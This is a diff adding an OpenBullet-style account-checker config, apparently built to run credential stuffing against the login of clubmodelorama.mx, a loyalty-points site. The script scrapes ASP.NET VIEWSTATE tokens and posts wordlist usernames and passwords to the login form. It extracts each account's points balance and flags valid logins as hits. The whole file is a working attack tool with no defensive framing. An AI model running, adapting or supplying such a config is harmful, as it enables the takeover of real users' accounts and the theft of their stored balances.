@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "modeloop",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-11-23T19:48:34.9390622-08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://clubmodelorama.mx/Home.aspx?content=accountstate" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "VIEWSTATEGENERATOR\" value=\"" "\"" -> VAR "VWG" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"" "\" />" -> VAR "VS" 
+
+FUNCTION URLEncode "<VS>" -> VAR "VSS" 
+
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+REQUEST POST "https://clubmodelorama.mx/" 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=<VSS>&__VIEWSTATEGENERATOR=<VWG>&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=0&ctl00%24Menu%24Login%24Login%24UserName=<US>&ctl00%24Menu%24Login%24Login%24Password=<PS>&ctl00%24Menu%24Login%24Login%24BtnSignIn=Iniciar+sesi%F3n&ctl00%24Menu%24HfActiveMenu=&ctl00%24Menu%24HfIsLogged=0&ctl00%24Menu%24TbxEmail=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate, br, zstd" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: clubmodelorama.mx" 
+  HEADER "Origin: https://clubmodelorama.mx" 
+  HEADER "Referer: https://clubmodelorama.mx/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "class=\"span-points\">" "</span>" -> VAR "PUNTOS" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Saldo en" 
+  KEYCHAIN Failure OR 
+    KEY "El correo es requerido." 
+
